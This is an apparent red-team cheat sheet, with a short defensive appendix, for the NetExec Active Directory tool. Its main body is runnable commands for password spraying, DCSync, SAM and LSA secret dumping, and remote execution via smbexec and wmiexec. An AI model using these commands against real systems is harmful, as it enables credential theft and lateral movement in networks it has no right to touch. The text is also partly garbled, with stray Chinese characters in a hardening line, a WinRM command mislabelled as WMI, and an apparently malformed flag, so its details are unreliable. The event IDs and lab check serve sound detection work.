---
title: NetExec (CrackMapExec)
phase: tools
platform: windows, linux
tags: [netexec, crackmapexec, smb, winrm, ldap, ad]
risk: high
attack_tactic: TA0007
attack_technique: T1018
data_sources: [smb-traffic, security-events, ldap-traffic]
last_review: 2026-05-25
---

# NetExec (formerly CrackMapExec)

### Objetivo

Herramienta de enumeración y movimiento lateral multi-protocolo para Active Directory y Windows networks.

### Comandos princpales

```bash
# SMB enumeration
netexec smb target -u user -p pass --shares

# Users enumeration
netexec smb target -u user -p pass --users

# Password spray
netexec smb domain.com -u users.txt -p Password123! --no-bruteforce

# WMI execution
netexec winrm target -u user -p pass -x "whoami"

# MSSQL execution
netexec mssql target -u user -p pass -q "SELECT @@version"
```

### AD Enumeration

```bash
# DCSync (needs domain admin)
netexec smb dc01.domain.local -u user -p pass -M dcsync

# SAM dump
netexec smb target -u user -p pass -M sam

# LSA secrets
netexec smb target -u user -p pass -M lsassy

# Enumerate ALL domain users
netexec ldap domain.com -u user -p pass --users
```

### Lateral Movement

```bash
# PsExec-like
netexec smb target -u user -p pass -x "calc.exe" --exec-method smbexec

# WMIExec
netexec smb target -u user -p pass -x "whoami" --exec-method wmiexec
```

### One-liners

```bash
# Quick check if creds are valid
netexec smb target -u user -p pass

# Extract all domain users
netexec ldap domain.com -u user -p pass --get-domainsusers

# Enumerate hosts with SMB signing disabled
netexec smb target -u user -p pass --continue-on-success | grep -E "Signing: False"
```

### Detección y Mitigación

- **Visibilidad:** Security Event 4624 (logon), 4688 (process creation), 4672 (special privileges), network SMB connections.
- **Hardening:** Enable SMB signing, limit admin logons from specific hosts, NLA, disable万股 admin shares.

### Validación de Cobertura

- **Prueba técnica:** netexec smb enumeration in lab.
- **Criterio de éxito:** SIEM alerts on mass SMB enumeration from a single source.
